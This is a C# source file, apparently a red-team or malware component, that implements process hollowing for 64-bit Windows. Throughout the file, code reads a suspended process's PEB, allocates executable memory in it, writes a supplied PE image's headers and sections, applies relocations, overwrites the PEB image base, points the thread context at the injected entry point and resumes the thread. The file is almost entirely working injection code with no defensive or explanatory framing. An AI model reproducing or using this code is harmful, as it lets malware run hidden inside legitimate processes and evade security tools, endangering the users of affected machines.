using System.Runtime.InteropServices;
using TerraFX.Interop.Windows;
using static TerraFX.Interop.Windows.Windows;

namespace ProcHollow
{
    public static unsafe class ProcessHollowing
    {
        // Structure to store the process address information.
        public struct ProcessAddressInformation
        {
            public void* lpProcessPEBAddress;
            public void* lpProcessImageBaseAddress;
        };

        [StructLayout(LayoutKind.Explicit, Size = 2)]
        public struct IMAGE_RELOCATION_ENTRY
        {
            [FieldOffset(0)]
            private ushort data;

            public ushort Offset
            {
                get { return (ushort)(data & 0x0FFF); }
                set { data = (ushort)((data & 0xF000) | (value & 0x0FFF)); }
            }

            public ushort Type
            {
                get { return (ushort)((data & 0xF000) >> 12); }
                set { data = (ushort)((data & 0x0FFF) | ((value & 0x000F) << 12)); }
            }
        }

        public static bool IsValidPE(void* pImage)
        {
            var pImageDOSHeader = (IMAGE_DOS_HEADER*)pImage;
            var pImageNTHeader = (IMAGE_NT_HEADERS64*)((ulong)pImageDOSHeader + (uint)pImageDOSHeader->e_lfanew);
            if (pImageNTHeader->Signature == IMAGE.IMAGE_NT_SIGNATURE)
                return true;

            return false;
        }

        public static bool IsPE32(void* pImage)
        {
            var pImageDOSHeader = (IMAGE_DOS_HEADER*)pImage;
            var pImageNTHeader = (IMAGE_NT_HEADERS32*)((ulong)pImageDOSHeader + (uint)pImageDOSHeader->e_lfanew);
            if (pImageNTHeader->OptionalHeader.Magic == IMAGE.IMAGE_NT_OPTIONAL_HDR32_MAGIC)
                return true;

            return false;
        }

        public static ProcessAddressInformation GetProcessAddressInformation(PROCESS_INFORMATION* lpPI)
        {
            void* pImageBaseAddress = null;

            void* pCtx = NativeMemory.AlignedAlloc((nuint)sizeof(AMD64_NT_CONTEXT), 16);

            try
            {
                var ctx = (AMD64_NT_CONTEXT*)pCtx;
                *ctx = new AMD64_NT_CONTEXT()
                {
                    ContextFlags = SYSTEM.CONTEXT_AMD64_FULL
                };

                if (!GetThreadContext(lpPI->hThread, pCtx))
                {
                    Console.WriteLine($"[-] Get thread context failed with error code: \"0x{GetLastError():X}\"!");
                    return new();
                }

                bool bReadBaseAddress = ReadProcessMemory(lpPI->hProcess, (void*)(ctx->Rdx + 0x10), &pImageBaseAddress, sizeof(ulong), null);
                if (!bReadBaseAddress)
                    return new();

                return new()
                {
                    lpProcessPEBAddress = (void*)ctx->Rdx,
                    lpProcessImageBaseAddress = pImageBaseAddress
                };
            }
            finally
            {
                NativeMemory.AlignedFree(pCtx);
            }
        }

        public static uint GetSubsystem(void* pImage)
        {
            var pImageDOSHeader = (IMAGE_DOS_HEADER*)pImage;
            var pImageNTHeader = (IMAGE_NT_HEADERS64*)((ulong)pImageDOSHeader + (uint)pImageDOSHeader->e_lfanew);
	        return pImageNTHeader->OptionalHeader.Subsystem;
        }

        public static ushort GetSubsystemEx(HANDLE hProcess, void* pImageBaseAddress)
        {
            IMAGE_DOS_HEADER ImageDOSHeader = new();
            var bGetDOSHeader = ReadProcessMemory(hProcess, pImageBaseAddress, &ImageDOSHeader, (uint)sizeof(IMAGE_DOS_HEADER), null);
            if (!bGetDOSHeader)
            {
                Console.WriteLine("[-] An error is occured when trying to get the target DOS header.");
                unchecked { return (ushort)-1; }
            }
            IMAGE_NT_HEADERS64 ImageNTHeader = new();
            var bGetNTHeader = ReadProcessMemory(hProcess, (void*)((ulong)pImageBaseAddress + (uint)ImageDOSHeader.e_lfanew), &ImageNTHeader, (uint)sizeof(IMAGE_NT_HEADERS64), null);
            if (!bGetNTHeader)
            {
                Console.WriteLine("[-] An error is occured when trying to get the target NT header.");
                unchecked { return (ushort)-1; }
            }

            return ImageNTHeader.OptionalHeader.Subsystem;
        }

        public static void CleanAndExitProcess(PROCESS_INFORMATION* lpPI, void* hFileContent)
        {
	        if (hFileContent != null && hFileContent != INVALID_HANDLE_VALUE)
		        HeapFree(GetProcessHeap(), NULL, hFileContent);

	        if (lpPI->hThread != NULL)
		        CloseHandle(lpPI->hThread);

	        if (lpPI->hProcess != NULL)
	        {
                unchecked { TerminateProcess(lpPI->hProcess, (uint)-1); }
                CloseHandle(lpPI->hProcess);
            }
        }

        public static void CleanProcess(PROCESS_INFORMATION* lpPI, void* hFileContent)
        {
	        if (hFileContent != null && hFileContent != INVALID_HANDLE_VALUE)
		        HeapFree(GetProcessHeap(), 0, hFileContent);

	        if (lpPI->hThread != NULL)
		        CloseHandle(lpPI->hThread);

	        if (lpPI->hProcess != NULL)
		        CloseHandle(lpPI->hProcess);
        }

        public static bool HasRelocations(void* pImage)
        {
            var pDOSHeader = (IMAGE_DOS_HEADER*)pImage;
            var pNTHeader = (IMAGE_NT_HEADERS64*)((ulong)pDOSHeader + (uint)pDOSHeader->e_lfanew);
            if (pNTHeader->OptionalHeader.DataDirectory[IMAGE.IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress != 0)
                return true;

            return false;
        }

        public static IMAGE_DATA_DIRECTORY GetRelocationsAddress(void* pImage)
        {
            var pImageDOSHeader = (IMAGE_DOS_HEADER*)pImage;
            var pImageNTHeader = (IMAGE_NT_HEADERS64*)((ulong)pImageDOSHeader + (uint)pImageDOSHeader->e_lfanew);
	        if (pImageNTHeader->OptionalHeader.DataDirectory[IMAGE.IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress != 0)
		        return pImageNTHeader->OptionalHeader.DataDirectory[IMAGE.IMAGE_DIRECTORY_ENTRY_BASERELOC];

	        return new();
        }

        public static bool RunPE(PROCESS_INFORMATION* lpPI, void* pImage)
        {
            void* lpAllocAddress;

            var pImageDOSHeader = (IMAGE_DOS_HEADER*)pImage;
            var pImageNTHeader64 = (IMAGE_NT_HEADERS64*)((ulong)pImageDOSHeader + (uint)pImageDOSHeader->e_lfanew);

            lpAllocAddress = VirtualAllocEx(lpPI->hProcess, (void*)pImageNTHeader64->OptionalHeader.ImageBase, pImageNTHeader64->OptionalHeader.SizeOfImage, MEM.MEM_COMMIT | MEM.MEM_RESERVE, PAGE.PAGE_EXECUTE_READWRITE);
	        if (lpAllocAddress == null)
	        {
		        Console.WriteLine("[-] An error is occured when trying to allocate memory for the new image.");
		        return false;
	        }

            Console.WriteLine($"[+] Memory allocate at : 0x{(ulong)lpAllocAddress:X}");

            bool bWriteHeaders = WriteProcessMemory(lpPI->hProcess, lpAllocAddress, pImage, pImageNTHeader64->OptionalHeader.SizeOfHeaders, null);
	        if (!bWriteHeaders)
	        {
                Console.WriteLine("[-] An error is occured when trying to write the headers of the new image.");
		        return false;
	        }

            Console.WriteLine($"[+] Wrote {pImageNTHeader64->OptionalHeader.SizeOfHeaders} header bytes at: 0x{pImageNTHeader64->OptionalHeader.ImageBase:X}");

            for (int i = 0; i < pImageNTHeader64->FileHeader.NumberOfSections; i++)
            {
                var pImageSectionHeader = (IMAGE_SECTION_HEADER*)((ulong)pImageNTHeader64 + 4 + (uint)sizeof(IMAGE_FILE_HEADER) + pImageNTHeader64->FileHeader.SizeOfOptionalHeader + (uint)(i * sizeof(IMAGE_SECTION_HEADER)));
                bool bWriteSection = WriteProcessMemory(lpPI->hProcess, (void*)((ulong)lpAllocAddress + pImageSectionHeader->VirtualAddress), (void*)((ulong)pImage + pImageSectionHeader->PointerToRawData), pImageSectionHeader->SizeOfRawData, null);
                var sectionName = Marshal.PtrToStringUTF8((IntPtr)pImageSectionHeader->Name, 8);
                if (!bWriteSection)
                {
                    Console.WriteLine($"[-] An error is occured when trying to write the section : {sectionName}.");
                    return false;
                }

                Console.WriteLine($"[+] Wrote {pImageSectionHeader->SizeOfRawData} bytes of section: {sectionName} data at: 0x{((ulong)lpAllocAddress + pImageSectionHeader->VirtualAddress):X}.");
            }

            void* pCtx = NativeMemory.AlignedAlloc((nuint)sizeof(AMD64_NT_CONTEXT), 16);

            try
            {
                var ctx = (AMD64_NT_CONTEXT*)pCtx;
                *ctx = new AMD64_NT_CONTEXT()
                {
                    ContextFlags = SYSTEM.CONTEXT_AMD64_FULL
                };

                bool bGetContext = GetThreadContext(lpPI->hThread, pCtx);
                if (!bGetContext)
                {
                    Console.WriteLine("[-] An error is occured when trying to get the thread context.");
                    return false;
                }

                bool bWritePEB = WriteProcessMemory(lpPI->hProcess, (void*)(ctx->Rdx + 0x10), &pImageNTHeader64->OptionalHeader.ImageBase, sizeof(ulong), null);
                if (!bWritePEB)
                {
                    Console.WriteLine("[-] An error is occured when trying to write the image base in the PEB.");
                    return false;
                }

                ctx->Rcx = (ulong)lpAllocAddress + pImageNTHeader64->OptionalHeader.AddressOfEntryPoint;

                bool bSetContext = SetThreadContext(lpPI->hThread, pCtx);
                if (!bSetContext)
                {
                    Console.WriteLine("[-] An error is occured when trying to set the thread context.");
                    return false;
                }

                ResumeThread(lpPI->hThread);
            }
            finally
            {
                NativeMemory.AlignedFree(pCtx);
            }

            return true;
        }

        public static bool RunPERelocate(PROCESS_INFORMATION* pPI, void* pImage)
        {

            void* lpAllocAddress;

            var pImageDOSHeader = (IMAGE_DOS_HEADER*)pImage;
            var pImageNTHeader64 = (IMAGE_NT_HEADERS64*)((ulong)pImageDOSHeader + (uint)pImageDOSHeader->e_lfanew);

            lpAllocAddress = VirtualAllocEx(pPI->hProcess, null, pImageNTHeader64->OptionalHeader.SizeOfImage, MEM.MEM_COMMIT | MEM.MEM_RESERVE, PAGE.PAGE_EXECUTE_READWRITE);
	        if (lpAllocAddress == null)
	        {
                Console.WriteLine($"[-] Allocation of memory failed with error code: \"0x{GetLastError():X}\"!");
		        return false;
	        }

            Console.WriteLine($"[+] Allocated memory for the new image at 0x{(ulong)lpAllocAddress:X}.");

            ulong deltaImageBase = (ulong)lpAllocAddress - pImageNTHeader64->OptionalHeader.ImageBase;

            pImageNTHeader64->OptionalHeader.ImageBase = (ulong)lpAllocAddress;

	        if (!WriteProcessMemory(pPI->hProcess, lpAllocAddress, pImage, pImageNTHeader64->OptionalHeader.SizeOfHeaders, null))
	        {
                Console.WriteLine($"[-] Writing headers failed with error code: \"0x{GetLastError():X}\"!");
		        return false;
	        }

            Console.WriteLine($"[+] Headers written to 0x{(ulong)lpAllocAddress:X}.");

            IMAGE_DATA_DIRECTORY relocationsAddress = GetRelocationsAddress(pImage);
            IMAGE_SECTION_HEADER* pRelocationsSection = null;

            for (int i = 0; i < pImageNTHeader64->FileHeader.NumberOfSections; i++)
            {
                var pImageSectionHeader = (IMAGE_SECTION_HEADER*)((ulong)pImageNTHeader64 + 4 + (uint)sizeof(IMAGE_FILE_HEADER) + pImageNTHeader64->FileHeader.SizeOfOptionalHeader + (uint)(i * sizeof(IMAGE_SECTION_HEADER)));
                if (relocationsAddress.VirtualAddress >= pImageSectionHeader->VirtualAddress && relocationsAddress.VirtualAddress < (pImageSectionHeader->VirtualAddress + pImageSectionHeader->Misc.VirtualSize))
                    pRelocationsSection = pImageSectionHeader;


                var sectionName = Marshal.PtrToStringUTF8((IntPtr)pImageSectionHeader->Name, 8);
                if (!WriteProcessMemory(pPI->hProcess, (void*)((ulong)lpAllocAddress + pImageSectionHeader->VirtualAddress), (void*)((ulong)pImage + pImageSectionHeader->PointerToRawData), pImageSectionHeader->SizeOfRawData, null))
                {
                    Console.WriteLine($"[-] Writing section \"{sectionName}\" failed with error code: \"0x{GetLastError():X}\"!");
                    return false;
                }

                Console.WriteLine($"[+] Wrote {pImageSectionHeader->SizeOfRawData} bytes of section \"{sectionName}\" to 0x{((ulong)lpAllocAddress + pImageSectionHeader->VirtualAddress):X}.");
            }

            if (pRelocationsSection == null)
            {
                Console.WriteLine("[-] Unable to find the relocation section of the source image.");
                return false;
            }

            var relocationSectionName = Marshal.PtrToStringUTF8((IntPtr)pRelocationsSection->Name, 8);
            Console.WriteLine($"[+] Found relocations in section \"{relocationSectionName}\".");

            uint relocationsOffset = 0x0;

            while (relocationsOffset < relocationsAddress.Size)
            {
                var pImageBaseRelocation = (IMAGE_BASE_RELOCATION*)((ulong)pImage + pRelocationsSection->PointerToRawData + relocationsOffset);
                relocationsOffset += (uint)sizeof(IMAGE_BASE_RELOCATION);

                uint numberOfEntries = (pImageBaseRelocation->SizeOfBlock - (uint)sizeof(IMAGE_BASE_RELOCATION)) / (uint)sizeof(IMAGE_RELOCATION_ENTRY);
                for (uint i = 0; i < numberOfEntries; i++)
                {
                    var pImageRelocationEntry = (IMAGE_RELOCATION_ENTRY*)((ulong)pImage + pRelocationsSection->PointerToRawData + relocationsOffset);
                    relocationsOffset += (uint)sizeof(IMAGE_RELOCATION_ENTRY);

                    if (pImageRelocationEntry->Type == 0)
                        continue;

                    ulong addressLocation = (ulong)lpAllocAddress + pImageBaseRelocation->VirtualAddress + pImageRelocationEntry->Offset;
                    ulong patchedAddress = 0;

                    if (!ReadProcessMemory(pPI->hProcess, (void*)addressLocation, &patchedAddress, sizeof(ulong), null))
                    {
                        Console.WriteLine($"[-] Reading relocation offset 0x{relocationsOffset:X} index {i} failed with error code: \"0x{GetLastError():X}\"!");
                        return false;
                    }

                    patchedAddress += deltaImageBase;

                    if (!WriteProcessMemory(pPI->hProcess, (void*)addressLocation, &patchedAddress, sizeof(ulong), null))
                    {
                        Console.WriteLine($"[-] Patching relocation offset 0x{relocationsOffset:X} index {i} failed with error code: \"0x{GetLastError():X}\"!");
                        return false;
                    }
                }
            }

            Console.WriteLine("[+] Relocations done.");

            void* pCtx = NativeMemory.AlignedAlloc((nuint)sizeof(AMD64_NT_CONTEXT), 16);
            if (pCtx == null)
            {
                Console.WriteLine($"[-] Failed to allocate aligned memory for \"NT Context\" struct!");
                return false;
            }

            try
            {
                var ctx = (AMD64_NT_CONTEXT*)pCtx;
                *ctx = new AMD64_NT_CONTEXT()
                {
                    ContextFlags = SYSTEM.CONTEXT_AMD64_FULL
                };

                if (!GetThreadContext(pPI->hThread, pCtx))
                {
                    Console.WriteLine($"[-] Get thread context failed with error code: \"0x{GetLastError():X}\"!");
                    return false;
                }

                if (!WriteProcessMemory(pPI->hProcess, (void*)(ctx->Rdx + 0x10), &pImageNTHeader64->OptionalHeader.ImageBase, sizeof(ulong), null))
                {
                    Console.WriteLine($"[-] Writing the image base in the PEB failed with error code: \"0x{GetLastError():X}\"!");
                    return false;
                }

                ctx->Rcx = (ulong)lpAllocAddress + pImageNTHeader64->OptionalHeader.AddressOfEntryPoint;

                if (!SetThreadContext(pPI->hThread, pCtx))
                {
                    Console.WriteLine($"[-] Set thread context failed with error code: \"0x{GetLastError():X}\"!");
                    return false;
                }

                unchecked
                {
                    if (ResumeThread(pPI->hThread) == (uint)-1)
                    {
                        Console.WriteLine($"[-] Resume thread failed with error code: \"0x{GetLastError():X}\"!");
                        return false;
                    }
                }
            }
            finally
            {
                NativeMemory.AlignedFree(pCtx);
            }

            return true;
        }
    }
}
